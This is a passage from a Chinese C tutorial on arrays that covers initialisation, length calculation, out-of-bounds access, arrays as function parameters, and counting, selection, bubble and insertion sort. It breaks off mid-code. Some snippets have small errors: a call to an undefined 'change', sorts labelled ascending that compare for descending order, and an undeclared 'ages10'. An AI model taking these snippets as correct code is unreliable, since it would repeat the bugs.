<span class="hljs-comment">    int score3 = 78;</span>
<span class="hljs-comment">    int score4 = 68;</span>
<span class="hljs-comment">    ...</span>
<span class="hljs-comment">    int score130 = 88;</span>
<span class="hljs-comment">    */</span>
    <span class="hljs-comment">// 数组: 如果需要保存`一组``相同类型`的数据, 就可以定义一个数组来保存</span>
    <span class="hljs-comment">// 只要定义好一个数组, 数组内部会给每一块小的存储空间一个编号, 这个编号我们称之为 索引, 索引从0开始</span>
    <span class="hljs-comment">// 1.定义一个可以保存3个int类型的数组</span>
    <span class="hljs-type">int</span> scores[<span class="hljs-number">3</span>];
    
    <span class="hljs-comment">// 2.通过数组的下标往数组中存放数据</span>
    scores[<span class="hljs-number">0</span>] = <span class="hljs-number">998</span>;
    scores[<span class="hljs-number">1</span>] = <span class="hljs-number">123</span>;
    scores[<span class="hljs-number">2</span>] = <span class="hljs-number">567</span>;
   
    <span class="hljs-comment">// 3.通过数组的下标从数组中取出存放的数据</span>
    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%i\n&quot;</span>, scores[<span class="hljs-number">0</span>]);
    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%i\n&quot;</span>, scores[<span class="hljs-number">1</span>]);
    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%i\n&quot;</span>, scores[<span class="hljs-number">2</span>]);
    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;
&#125;</code></pre>
<h2 id="定义数组">定义数组</h2>
<ul>
<li>元素类型 数组名[元素个数];</li>
</ul>
<pre><code class="hljs c"><span class="hljs-comment">// int 元素类型</span>
<span class="hljs-comment">// ages 数组名称</span>
<span class="hljs-comment">// [10] 元素个数</span>
<span class="hljs-type">int</span> ages[<span class="hljs-number">10</span>];</code></pre>
<h2 id="初始化数组">初始化数组</h2>
<ul>
<li><strong>定义的同时初始化</strong></li>
<li>指定元素个数,完全初始化
<ul>
<li>其中在{ }中的各数据值即为各元素的初值,各值之间用逗号间隔</li>
</ul>
</li>
</ul>
<pre><code class="hljs c"><span class="hljs-type">int</span> ages[<span class="hljs-number">3</span>] = &#123;<span class="hljs-number">4</span>, <span class="hljs-number">6</span>, <span class="hljs-number">9</span>&#125;;</code></pre>
<ul>
<li>不指定元素个数,完全初始化
<ul>
<li>根据大括号中的元素的个数来确定数组的元素个数</li>
</ul>
</li>
</ul>
<pre><code class="hljs c"><span class="hljs-type">int</span> nums[] = &#123;<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,<span class="hljs-number">5</span>,<span class="hljs-number">6</span>&#125;;</code></pre>
<ul>
<li>指定元素个数,部分初始化
<ul>
<li>没有显式初始化的元素,那么系统会自动将其初始化为0</li>
</ul>
</li>
</ul>
<pre><code class="hljs plaintext">int nums[10] = &#123;1,2&#125;;</code></pre>
<ul>
<li>指定元素个数,部分初始化</li>
</ul>
<pre><code class="hljs c"><span class="hljs-type">int</span> nums[<span class="hljs-number">5</span>] = &#123;[<span class="hljs-number">4</span>] = <span class="hljs-number">3</span>,[<span class="hljs-number">1</span>] = <span class="hljs-number">2</span>&#125;;</code></pre>
<ul>
<li>不指定元素个数,部分初始化</li>
</ul>
<pre><code class="hljs c"><span class="hljs-type">int</span> nums[] = &#123;[<span class="hljs-number">4</span>] = <span class="hljs-number">3</span>&#125;;</code></pre>
<ul>
<li><strong>先定义后初始化</strong></li>
</ul>
<pre><code class="hljs c"><span class="hljs-type">int</span> nums[<span class="hljs-number">3</span>];
nums[<span class="hljs-number">0</span>] = <span class="hljs-number">1</span>;
nums[<span class="hljs-number">1</span>] = <span class="hljs-number">2</span>;
nums[<span class="hljs-number">2</span>] = <span class="hljs-number">3</span>;</code></pre>
<ul>
<li>没有初始化会怎样?
<ul>
<li>如果定义数组后,没有初始化,数组中是有值的,是随机的垃圾数,所以如果想要正确使用数组应该要进行初始化。</li>
</ul>
</li>
</ul>
<pre><code class="hljs c"><span class="hljs-type">int</span> nums[<span class="hljs-number">5</span>];
<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d\n&quot;</span>, nums[<span class="hljs-number">0</span>]);
<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d\n&quot;</span>, nums[<span class="hljs-number">1</span>]);
<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d\n&quot;</span>, nums[<span class="hljs-number">2</span>]);
<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d\n&quot;</span>, nums[<span class="hljs-number">3</span>]);
<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d\n&quot;</span>, nums[<span class="hljs-number">4</span>]);
输出结果:
<span class="hljs-number">0</span>
<span class="hljs-number">0</span>
<span class="hljs-number">1606416312</span>
<span class="hljs-number">0</span>
<span class="hljs-number">1606416414</span></code></pre>
<ul>
<li>
<p>注意点:</p>
</li>
<li>
<p>使用数组时不能超出数组的索引范围使用, 索引从0开始, 到元素个数-1结束</p>
</li>
<li>
<p>使用数组时不要随意使用未初始化的元素, 有可能是一个随机值</p>
</li>
<li>
<p>对于数组来说, 只能在定义的同时初始化多个值, 不能先定义再初始化多个值</p>
</li>
</ul>
<pre><code class="hljs plaintext">int ages[3];
ages = &#123;4, 6, 9&#125;; // 报错</code></pre>
<h2 id="数组的使用">数组的使用</h2>
<ul>
<li>通过下标（索引）访问：</li>
</ul>
<pre><code class="hljs c"><span class="hljs-comment">// 找到下标为0的元素, 赋值为10</span>
ages[<span class="hljs-number">0</span>]=<span class="hljs-number">10</span>;
<span class="hljs-comment">// 取出下标为2的元素保存的值</span>
<span class="hljs-type">int</span> a = ages[<span class="hljs-number">2</span>];
<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;a = %d&quot;</span>, a);</code></pre>
<h2 id="数组的遍历">数组的遍历</h2>
<ul>
<li>数组的遍历:遍历的意思就是有序地查看数组的每一个元素</li>
</ul>
<pre><code class="hljs c"><span class="hljs-type">int</span> ages[<span class="hljs-number">4</span>] = &#123;<span class="hljs-number">19</span>, <span class="hljs-number">22</span>, <span class="hljs-number">33</span>, <span class="hljs-number">13</span>&#125;;
<span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">4</span>; i++) &#123;
    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;ages[%d] = %d\n&quot;</span>, i, ages[i]);
&#125;</code></pre>
<h2 id="数组长度计算方法">数组长度计算方法</h2>
<ul>
<li>因为数组在内存中占用的字节数取决于其存储的数据类型和数据的个数
<ul>
<li>数组所占用存储空间 = 一个元素所占用存储空间 * 元素个数(数组长度)</li>
</ul>
</li>
<li>所以计算数组长度可以使用如下方法<br>
数组的长度 = 数组占用的总字节数 / 数组元素占用的字节数</li>
</ul>
<pre><code class="hljs c">    <span class="hljs-type">int</span> ages[<span class="hljs-number">4</span>] = &#123;<span class="hljs-number">19</span>, <span class="hljs-number">22</span>, <span class="hljs-number">33</span>, <span class="hljs-number">13</span>&#125;;
    <span class="hljs-type">int</span> length =  <span class="hljs-keyword">sizeof</span>(ages)/<span class="hljs-keyword">sizeof</span>(<span class="hljs-type">int</span>);
    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;length = %d&quot;</span>, length);
输出结果: <span class="hljs-number">4</span></code></pre>
<h2 id="练习">练习</h2>
<ul>
<li>正序输出(遍历)数组</li>
</ul>
<pre><code class="hljs c"><span class="hljs-type">int</span> ages[<span class="hljs-number">4</span>] = &#123;<span class="hljs-number">19</span>, <span class="hljs-number">22</span>, <span class="hljs-number">33</span>, <span class="hljs-number">13</span>&#125;;
<span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">4</span>; i++) &#123;
    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;ages[%d] = %d\n&quot;</span>, i, ages[i]);
&#125;</code></pre>
<ul>
<li>逆序输出(遍历)数组</li>
</ul>
<pre><code class="hljs plaintext">int ages[4] = &#123;19, 22, 33, 13&#125;;
for (int i = 3; i &gt;=0; i--) &#123;
    printf(&quot;ages[%d] = %d\n&quot;, i, ages[i]);
&#125;</code></pre>
<ul>
<li>从键盘输入数组长度,构建一个数组,然后再通过for循环从键 盘接收数字给数组初始化。并使用for循环输出查看</li>
</ul>
<hr>
<h2 id="数组内部存储细节">数组内部存储细节</h2>
<ul>
<li>
<p>存储方式:</p>
<ul>
<li>1)内存寻址从大到小, 从高地址开辟一块连续没有被使用的内存给数组</li>
<li>2)从分配的连续存储空间中, 地址小的位置开始给每个元素分配空间</li>
<li>3)从每个元素分配的存储空间中, 地址最大的位置开始存储数据</li>
<li>4)用数组名指向整个存储空间最小的地址</li>
</ul>
</li>
<li>
<p>示例</p>
</li>
</ul>
<pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span>
<span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span>
&#123;
    <span class="hljs-type">int</span> num = <span class="hljs-number">9</span>;
    <span class="hljs-type">char</span> cs[] = &#123;<span class="hljs-string">&#x27;l&#x27;</span>,<span class="hljs-string">&#x27;n&#x27;</span>,<span class="hljs-string">&#x27;j&#x27;</span>&#125;;
    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;cs = %p\n&quot;</span>, &amp;cs);       <span class="hljs-comment">// cs = 0060FEA9</span>
    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;cs[0] = %p\n&quot;</span>, &amp;cs[<span class="hljs-number">0</span>]); <span class="hljs-comment">// cs[0] = 0060FEA9</span>
    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;cs[1] = %p\n&quot;</span>, &amp;cs[<span class="hljs-number">1</span>]); <span class="hljs-comment">// cs[1] = 0060FEAA</span>
    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;cs[2] = %p\n&quot;</span>, &amp;cs[<span class="hljs-number">2</span>]); <span class="hljs-comment">// cs[2] = 0060FEAB</span>

    <span class="hljs-type">int</span> nums[] = &#123;<span class="hljs-number">2</span>, <span class="hljs-number">6</span>&#125;;
    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;nums = %p\n&quot;</span>, &amp;nums);      <span class="hljs-comment">// nums = 0060FEA0</span>
    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;nums[0] = %p\n&quot;</span>, &amp;nums[<span class="hljs-number">0</span>]);<span class="hljs-comment">// nums[0] = 0060FEA0</span>
    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;nums[1] = %p\n&quot;</span>, &amp;nums[<span class="hljs-number">1</span>]);<span class="hljs-comment">// nums[1] = 0060FEA4</span>
    
    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;
&#125;</code></pre>
<p><img src="https://img-blog.csdnimg.cn/img_convert/d019b24544e1193652a9a7d016c5653f.png" alt="img"></p>
<ul>
<li>
<blockquote>
<p>注意:字符在内存中是以对应ASCII码值的二进制形式存储的,而非上述的形式。</p>
</blockquote>
</li>
</ul>
<h2 id="数组的越界问题">数组的越界问题</h2>
<ul>
<li>数组越界导致的问题
<ul>
<li>约错对象</li>
<li>程序崩溃</li>
</ul>
</li>
</ul>
<pre><code class="hljs c">    <span class="hljs-type">char</span> cs1[<span class="hljs-number">2</span>] = &#123;<span class="hljs-number">1</span>, <span class="hljs-number">2</span>&#125;;
    <span class="hljs-type">char</span> cs2[<span class="hljs-number">3</span>] = &#123;<span class="hljs-number">3</span>, <span class="hljs-number">4</span>, <span class="hljs-number">5</span>&#125;;
    cs2[<span class="hljs-number">3</span>] = <span class="hljs-number">88</span>; <span class="hljs-comment">// 注意:这句访问到了不属于cs1的内存</span>
    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;cs1[0] = %d\n&quot;</span>, cs1[<span class="hljs-number">0</span>] );
输出结果: <span class="hljs-number">88</span></code></pre>
<blockquote>
<p>为什么上述会输出88, 自己按照&quot;数组内部存储细节&quot;画图脑补</p>
</blockquote>
<h2 id="数组注意事项">数组注意事项</h2>
<ul>
<li>在定义数组的时候[]里面只能写整型常量或者是返回整型常量的表达式</li>
</ul>
<pre><code class="hljs c"><span class="hljs-type">int</span> ages4[<span class="hljs-string">&#x27;A&#x27;</span>] = &#123;<span class="hljs-number">19</span>, <span class="hljs-number">22</span>, <span class="hljs-number">33</span>&#125;;
<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;ages4[0] = %d\n&quot;</span>, ages4[<span class="hljs-number">0</span>]);

 <span class="hljs-type">int</span> ages5[<span class="hljs-number">5</span> + <span class="hljs-number">5</span>] = &#123;<span class="hljs-number">19</span>, <span class="hljs-number">22</span>, <span class="hljs-number">33</span>&#125;;
 <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;ages5[0] = %d\n&quot;</span>, ages5[<span class="hljs-number">0</span>]);

 <span class="hljs-type">int</span> ages5[<span class="hljs-string">&#x27;A&#x27;</span> + <span class="hljs-number">5</span>] = &#123;<span class="hljs-number">19</span>, <span class="hljs-number">22</span>, <span class="hljs-number">33</span>&#125;;
 <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;ages5[0] = %d\n&quot;</span>, ages5[<span class="hljs-number">0</span>]);</code></pre>
<ul>
<li>错误写法</li>
</ul>
<pre><code class="hljs c"><span class="hljs-comment">// 没有指定元素个数，错误</span>
<span class="hljs-type">int</span> a[];

<span class="hljs-comment">// []中不能放变量</span>
<span class="hljs-type">int</span> number = <span class="hljs-number">10</span>;
<span class="hljs-type">int</span> ages[number]; <span class="hljs-comment">// 老版本的C语言规范不支持</span>
<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d\n&quot;</span>, ages[<span class="hljs-number">4</span>]);

<span class="hljs-type">int</span> number = <span class="hljs-number">10</span>;
<span class="hljs-type">int</span> ages2[number] = &#123;<span class="hljs-number">19</span>, <span class="hljs-number">22</span>, <span class="hljs-number">33</span>&#125; <span class="hljs-comment">// 直接报错</span>

<span class="hljs-comment">// 只能在定义数组的时候进行一次性（全部赋值）的初始化</span>
<span class="hljs-type">int</span> ages3[<span class="hljs-number">5</span>];
ages10 = &#123;<span class="hljs-number">19</span>, <span class="hljs-number">22</span>, <span class="hljs-number">33</span>&#125;;

<span class="hljs-comment">// 一个长度为n的数组,最大下标为n-1, 下标范围:0~n-1</span>
<span class="hljs-type">int</span> ages4[<span class="hljs-number">4</span>] = &#123;<span class="hljs-number">19</span>, <span class="hljs-number">22</span>, <span class="hljs-number">33</span>&#125;
ages4[<span class="hljs-number">8</span>]; <span class="hljs-comment">// 数组角标越界</span></code></pre>
<ul>
<li>练习
<ul>
<li>从键盘录入当天出售BTC的价格并计算出售的BTC的总价和平均价(比如说一天出售了10个比特币)</li>
</ul>
</li>
</ul>
<hr>
<h2 id="数组和函数">数组和函数</h2>
<ul>
<li>数组可以作为函数的参数使用,数组用作函数参数有两种形式:
<ul>
<li>￼一种是把数组元素作为实参使用</li>
<li>￼一种是把数组名作为函数的形参和实参使用</li>
</ul>
</li>
</ul>
<h2 id="数组元素作为函数参数">数组元素作为函数参数</h2>
<ul>
<li>数组的元素作为函数实参，与同类型的简单变量作为实参一样，如果是基本数据类型, 那么形参的改变不影响实参</li>
</ul>
<pre><code class="hljs c"><span class="hljs-type">void</span> <span class="hljs-title function_">change</span><span class="hljs-params">(<span class="hljs-type">int</span> val)</span><span class="hljs-comment">// int val = number</span>
&#123;
    val = <span class="hljs-number">55</span>;
&#125;
<span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">const</span> <span class="hljs-type">char</span> * argv[])</span>
&#123;
    <span class="hljs-type">int</span> ages[<span class="hljs-number">3</span>] = &#123;<span class="hljs-number">1</span>, <span class="hljs-number">5</span>, <span class="hljs-number">8</span>&#125;;
    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;ages[0] = %d&quot;</span>, ages[<span class="hljs-number">0</span>]);<span class="hljs-comment">// 1</span>
    change(ages[<span class="hljs-number">0</span>]);
    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;ages[0] = %d&quot;</span>, ages[<span class="hljs-number">0</span>]);<span class="hljs-comment">// 1</span>
&#125;</code></pre>
<blockquote>
<ul>
<li>用数组元素作函数参数不要求形参也必须是数组元素</li>
</ul>
</blockquote>
<h2 id="数组名作为函数参数">数组名作为函数参数</h2>
<ul>
<li>在C语言中,数组名除作为变量的标识符之外,数组名还代表了该数组在内存中的起始地址,因此,当数组名作函数参数时,实参与形参之间不是&quot;值传递&quot;,而是&quot;地址传递&quot;</li>
<li>实参数组名将该数组的起始地址传递给形参数组,两个数组共享一段内存单元, 系统不再为形参数组分配存储单元</li>
<li>既然两个数组共享一段内存单元, 所以形参数组修改时，实参数组也同时被修改了</li>
</ul>
<pre><code class="hljs c"><span class="hljs-type">void</span> <span class="hljs-title function_">change2</span><span class="hljs-params">(<span class="hljs-type">int</span> <span class="hljs-built_in">array</span>[<span class="hljs-number">3</span>])</span><span class="hljs-comment">// int array = 0ffd1</span>
&#123;
    <span class="hljs-built_in">array</span>[<span class="hljs-number">0</span>] = <span class="hljs-number">88</span>;
&#125;
<span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">const</span> <span class="hljs-type">char</span> * argv[])</span>
&#123;
    <span class="hljs-type">int</span> ages[<span class="hljs-number">3</span>] = &#123;<span class="hljs-number">1</span>, <span class="hljs-number">5</span>, <span class="hljs-number">8</span>&#125;;
    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;ages[0] = %d&quot;</span>, ages[<span class="hljs-number">0</span>]);<span class="hljs-comment">// 1</span>
    change(ages);
    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;ages[0] = %d&quot;</span>, ages[<span class="hljs-number">0</span>]);<span class="hljs-comment">// 88</span>
&#125;</code></pre>
<h2 id="数组名作函数参数的注意点">数组名作函数参数的注意点</h2>
<ul>
<li>在函数形参表中,允许不给出形参数组的长度</li>
</ul>
<pre><code class="hljs c"><span class="hljs-type">void</span> <span class="hljs-title function_">change</span><span class="hljs-params">(<span class="hljs-type">int</span> <span class="hljs-built_in">array</span>[])</span>
&#123;
    <span class="hljs-built_in">array</span>[<span class="hljs-number">0</span>] = <span class="hljs-number">88</span>;
&#125;</code></pre>
<ul>
<li>形参数组和实参数组的类型必须一致,否则将引起错误。</li>
</ul>
<pre><code class="hljs c"><span class="hljs-type">void</span> <span class="hljs-title function_">prtArray</span><span class="hljs-params">(<span class="hljs-type">double</span> <span class="hljs-built_in">array</span>[<span class="hljs-number">3</span>])</span> <span class="hljs-comment">// 错误写法</span>
&#123;
    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">3</span>; i++) &#123;
        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;array[%d], %f&quot;</span>, i, <span class="hljs-built_in">array</span>[i]);
    &#125;
&#125;
<span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">const</span> <span class="hljs-type">char</span> * argv[])</span>
&#123;
    <span class="hljs-type">int</span> ages[<span class="hljs-number">3</span>] = &#123;<span class="hljs-number">1</span>, <span class="hljs-number">5</span>, <span class="hljs-number">8</span>&#125;;
    prtArray(ages[<span class="hljs-number">0</span>]);
&#125;</code></pre>
<ul>
<li>当数组名作为函数参数时, 因为自动转换为了指针类型，所以在函数中无法动态计算除数组的元素个数</li>
</ul>
<pre><code class="hljs c"><span class="hljs-type">void</span> <span class="hljs-title function_">printArray</span><span class="hljs-params">(<span class="hljs-type">int</span> <span class="hljs-built_in">array</span>[])</span>
&#123;
    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;printArray size = %lu\n&quot;</span>, <span class="hljs-keyword">sizeof</span>(<span class="hljs-built_in">array</span>)); <span class="hljs-comment">// 8</span>
    <span class="hljs-type">int</span> length = <span class="hljs-keyword">sizeof</span>(<span class="hljs-built_in">array</span>)/ <span class="hljs-keyword">sizeof</span>(<span class="hljs-type">int</span>); <span class="hljs-comment">// 2</span>
    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;length = %d&quot;</span>, length);
&#125;</code></pre>
<ul>
<li>练习:
<ul>
<li>设计一个函数int arrayMax(int a[], int count)找出数组元素的最大值</li>
<li>从键盘输入3个0-9的数字,然后输出0~9中哪些数字没有出现过</li>
<li>要求从键盘输入6个0~9的数字,排序后输出</li>
</ul>
</li>
</ul>
<h2 id="计数排序counting-sort">计数排序（Counting Sort）</h2>
<ul>
<li>
<p>计数排序是一个非基于比较的排序算法，该算法于1954年由 Harold H. Seward 提出。它的优势在于在<code>对一定范围内的整数排序</code>时，快于任何比较排序算法。</p>
</li>
<li>
<p>排序思路:</p>
<ul>
<li>1.找出待排序数组最大值</li>
<li>2.定义一个索引最大值为待排序数组最大值的数组</li>
<li>3.遍历待排序数组, 将待排序数组遍历到的值作新数组索引</li>
<li>4.在新数组对应索引存储值原有基础上+1<br>
<img src="https://img-blog.csdnimg.cn/img_convert/c743dd0ca9c48dc0583f747808e0d501.png" alt="img"></li>
</ul>
</li>
<li>
<p>简单代码实现:</p>
</li>
</ul>
<pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span>
&#123;
    <span class="hljs-comment">// 待排序数组</span>
    <span class="hljs-type">int</span> nums[<span class="hljs-number">5</span>] = &#123;<span class="hljs-number">3</span>, <span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">0</span>, <span class="hljs-number">3</span>&#125;;
    <span class="hljs-comment">// 用于排序数组</span>
    <span class="hljs-type">int</span> newNums[<span class="hljs-number">4</span>] = &#123;<span class="hljs-number">0</span>&#125;;
    <span class="hljs-comment">// 计算待排序数组长度</span>
    <span class="hljs-type">int</span> len = <span class="hljs-keyword">sizeof</span>(nums) / <span class="hljs-keyword">sizeof</span>(nums[<span class="hljs-number">0</span>]);
    <span class="hljs-comment">// 遍历待排序数组</span>
    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; len; i++)&#123;
        <span class="hljs-comment">// 取出待排序数组当前值</span>
        <span class="hljs-type">int</span> index = nums[i];
        <span class="hljs-comment">// 将待排序数组当前值作为排序数组索引</span>
        <span class="hljs-comment">// 将用于排序数组对应索引原有值+1</span>
        newNums[index] = newNums[index] +<span class="hljs-number">1</span>;
    &#125;
    
    <span class="hljs-comment">// 计算待排序数组长度</span>
    <span class="hljs-type">int</span> len2 = <span class="hljs-keyword">sizeof</span>(newNums) / <span class="hljs-keyword">sizeof</span>(newNums[<span class="hljs-number">0</span>]);
    <span class="hljs-comment">// 输出排序数组索引, 就是排序之后结果</span>
    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; len2; i++)&#123;
        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> j = <span class="hljs-number">0</span>; j &lt; newNums[i]; j++)&#123;
            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%i\n&quot;</span>, i);
        &#125;
    &#125;
    <span class="hljs-comment">/*</span>
<span class="hljs-comment">    // 计算待排序数组长度</span>
<span class="hljs-comment">    int len2 = sizeof(newNums) / sizeof(newNums[0]);</span>
<span class="hljs-comment">    // 还原排序结果到待排序数组</span>
<span class="hljs-comment">    for(int i = 0; i &lt; len2; i++)&#123;</span>
<span class="hljs-comment">        int index = 0;</span>
<span class="hljs-comment">        for(int i = 0; i &lt; len; i++)&#123;</span>
<span class="hljs-comment">            for(int j = 0; j &lt; newNums[i]; j++)&#123;</span>
<span class="hljs-comment">                nums[index++] = i;</span>
<span class="hljs-comment">            &#125;</span>
<span class="hljs-comment">        &#125;</span>
<span class="hljs-comment">    &#125;</span>
<span class="hljs-comment">    */</span>
    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;
&#125;</code></pre>
<h2 id="选择排序">选择排序</h2>
<ul>
<li>选择排序(Selection sort)是一种简单直观的排序算法。它的工作原理如下。首先在未排序序列中找到最小元素,存放到排序序列的起始位置,然后,再从剩余未排序元素中继续寻找最小元素,然后放到排序序列末尾。以此类推,直到所有元素均排序完毕。<br>
<img src="https://img-blog.csdnimg.cn/img_convert/1e455b4fe72240a0a7f19d390da91aa9.gif" alt="img"></li>
<li>排序思路:
<ul>
<li>假设按照升序排序</li>
<li>1.用第0个元素和后面所有元素依次比较</li>
<li>2.判断第0个元素是否大于当前被比较元素, 一旦小于就交换位置</li>
<li>3.第0个元素和后续所有元素比较完成后, 第0个元素就是最小值</li>
<li>4.排除第0个元素, 用第1个元素重复1~3操作, 比较完成后第1个元素就是倒数第二小的值</li>
<li>以此类推, 直到当前元素没有可比较的元素, 排序完成</li>
</ul>
</li>
<li>代码实现:</li>
</ul>
<pre><code class="hljs plaintext">// 选择排序
void selectSort(int numbers[], int length) &#123;
    
    // 外循环为什么要-1?
    // 最后一位不用比较, 也没有下一位和它比较, 否则会出现错误访问
    for (int i = 0; i &lt; length; i++) &#123;
        for (int j = i; j &lt; length - 1; j++) &#123;
            // 1.用当前元素和后续所有元素比较
            if (numbers[i] &lt; numbers[j + 1]) &#123;
                //  2.一旦发现小于就交换位置
                swapEle(numbers, i, j + 1);
            &#125;
        &#125;
    &#125;
&#125;
// 交换两个元素的值, i/j需要交换的索引
void swapEle(int array[], int i, int j) &#123;
    int temp = array[i];
    array[i] = array[j];
    array[j] = temp;
&#125;</code></pre>
<h2 id="冒泡排序">冒泡排序</h2>
<ul>
<li>冒泡排序(Bubble Sort)是一种简单的排序算法。它重复 地走访过要排序的数列,一次比较两个元素,如果他们的顺序错误就把他们交换过来。走访数列的工作是重复地进行直到没有再需要交换,也就是说该数列已经排序完成。这个算法的名字由来是因为越小的元素会经由交换慢慢“浮”到数列的顶端。<br>
[外链图片转存中…(img-jCHVM4B0-1648814825893)]</li>
<li>排序思路:
<ul>
<li>假设按照升序排序</li>
<li>1.从第0个元素开始, 每次都用相邻两个元素进行比较</li>
<li>2.一旦发现后面一个元素小于前面一个元素就交换位置</li>
<li>3.经过一轮比较之后最后一个元素就是最大值</li>
<li>4.排除最后一个元素, 以此类推, 每次比较完成之后最大值都会出现再被比较所有元素的最后</li>
<li>直到当前元素没有可比较的元素, 排序完成</li>
</ul>
</li>
<li>代码实现:</li>
</ul>
<pre><code class="hljs plaintext">// 冒泡排序
void bubbleSort(int numbers[], int length) &#123;
    for (int i = 0; i &lt; length; i++) &#123;
        // -1防止`角标越界`: 访问到了不属于自己的索引
        for (int j = 0; j &lt; length - i - 1; j++) &#123;
           //  1.用当前元素和相邻元素比较
            if (numbers[j] &lt; numbers[j + 1]) &#123;
                //  2.一旦发现小于就交换位置
                swapEle(numbers, j, j + 1);
            &#125;
        &#125;
    &#125;
&#125;
// 交换两个元素的值, i/j需要交换的索引
void swapEle(int array[], int i, int j) &#123;
    int temp = array[i];
    array[i] = array[j];
    array[j] = temp;
&#125;</code></pre>
<h2 id="插入排序">插入排序</h2>
<ul>
<li>插入排序（Insertion-Sort）的算法描述是一种简单直观的排序算法。它的工作原理是通过构建有序序列，对于未排序数据，在已排序序列中从后向前扫描，找到相应位置并插入。<br>
<img src="https://img-blog.csdnimg.cn/img_convert/4716889ba52c62aaf8ef03fcb45cbf1e.gif" alt="img"></li>
<li>排序思路:
<ul>
<li>假设按照升序排序</li>
<li>1.从索引为1的元素开始向前比较, 一旦前面一个元素大于自己就让前面的元素先后移动</li>
<li>2.直到没有可比较元素或者前面的元素小于自己的时候, 就将自己插入到当前空出来的位置</li>
</ul>
</li>
<li>代码实现:</li>
</ul>
<pre><code class="hljs plaintext">int main()
&#123;
    // 待排序数组
    int nums[5] = &#123;3, 1, 2, 0, 3&#125;;
    // 0.计算待排序数组长度
    int len = sizeof(nums) / sizeof(nums[0]);

    //  1.从第一个元素开始依次取出所有用于比较元素
    for (int i = 1; i &lt; len; i++)
    &#123;
        // 2.取出用于比较元素
        int temp = nums[i];
        int j = i;
        while(j &gt; 0)&#123;
            // 3.判断元素是否小于前一个元素
            if(temp &lt; nums[j - 1])&#123;
                // 4.让前一个元素向后移动一位
                nums[j] = nums[j - 1];
            &#125;else&#123;
                break;
            &#125;
            j--;
        &#125;
        // 5.将元素插入到空出来的位置
        nums[j] = temp;
    &#125;
&#125;</code></pre>
<pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span>
&#123;
    <span class="hljs-comment">// 待排序数组</span>
    <span class="hljs-type">int</span> nums[<span class="hljs-number">5</span>] = &#123;<span class="hljs-number">3</span>, <span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">0</span>, <span class="hljs-number">3</span>&#125;;
    <span class="hljs-comment">// 0.计算待排序数组长度</span>
    <span class="hljs-type">int</span> len = <span class="hljs-keyword">sizeof</span>(nums) / <span class="hljs-keyword">sizeof</span>(nums[<span class="hljs-number">0</span>]);

    <span class="hljs-comment">//  1.从第一个元素开始依次取出所有用于比较元素</span>
    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">1</span>; i &lt; len; i++)
    &#123;
        <span class="hljs-comment">// 2.遍历取出前面元素进行比较</span>
        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> j = i; j &gt; <span class="hljs-number">0</span>; j--)
        &#123;
            <span class="hljs-comment">// 3.如果前面一个元素大于当前元素,就交换位置</span>
